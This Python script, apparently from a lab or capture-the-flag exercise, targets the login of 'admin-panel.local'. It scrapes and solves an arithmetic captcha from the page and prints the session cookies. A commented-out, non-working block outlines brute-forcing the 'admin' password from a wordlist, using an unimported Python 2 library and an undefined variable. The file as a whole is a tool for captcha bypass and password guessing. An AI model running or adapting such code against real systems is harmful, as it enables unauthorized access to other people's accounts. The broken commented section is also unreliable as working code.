from email import header
import sys
import urllib
import requests
from bs4 import BeautifulSoup
import re

site = 'http://admin-panel.local'

response = requests.get(site)

if response.status_code == 200:

    session_cookies = response.cookies

    soup = BeautifulSoup(response.text, "html.parser")

    
    captcha_input = soup.find('input', {'name': 'captcha'})
    if captcha_input:
        placeholder_text = captcha_input.get('placeholder')
        print("Texte du placeholder :", placeholder_text)

        numbers = re.findall(r'\d+', placeholder_text)
        
        operator = re.search(r'[+\-*/]', placeholder_text).group()
            
        num1 = int(numbers[0])
        num2 = int(numbers[1])
                
        if operator == '+':
            result = num1 + num2
        elif operator == '-':
            result = num1 - num2
        elif operator == '*':
            result = num1 * num2
        elif operator == '/':
            result = num1 / num2
                
        print(f"Expression arithmétique : {num1} {operator} {num2}")
        print(f"Résultat : {result}")

        # Afficher les cookies de session
        print("Cookies de session :")
        for cookie in session_cookies:
            print(f"{cookie.name}: {cookie.value}")

    else:
        print("Aucun élément captcha trouvé.")

else:
    print("Échec de la requête GET :", response.status_code)




"""params1 = urllib.urlencode({'user' : 'admin', 'password' : 'aaaa'})
header = {"Content-Type" : 'application/x-www-form-urlencoded'}

conn = httplib.HTTPConnection(site)

def extractCaptcha(expresion):
    #return the captcha string
    print(a)

with open("/usr/share/wordlists/wordlist.txt" ,'r') as file  :
    for line in file :
        password = line.strip()

        params = params1.replace('aaaa', password)

        conn.request("POST", params, header)"""

